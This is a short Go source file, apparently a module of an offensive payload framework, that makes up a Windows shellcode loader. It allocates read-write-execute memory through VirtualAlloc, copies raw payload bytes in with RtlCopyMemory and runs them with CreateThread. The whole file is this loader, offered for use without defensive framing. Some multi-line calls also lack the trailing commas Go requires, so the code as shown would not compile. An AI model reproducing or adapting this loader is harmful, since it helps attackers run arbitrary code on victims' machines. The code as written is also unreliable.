// +build payload_type_shellcode

package payloads

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type shellcode struct {
	payload_bits int
	payload_data []byte
}

func (sc shellcode) run() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	CreateThread := kernel32.NewProc("CreateThread")

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")


	addr, _, _ := VirtualAlloc.Call(
		uintptr(0), 
		uintptr(sc.payload_bits/8), 
		0x3000, 
		0x40
	)


	RtlCopyMemory.Call(
		addr, 
		(uintptr)(unsafe.Pointer(&sc.payload_data[0])), 
		uintptr(sc.payload_bits/8)
	)

	CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	time.Sleep(2 * time.Second)
}
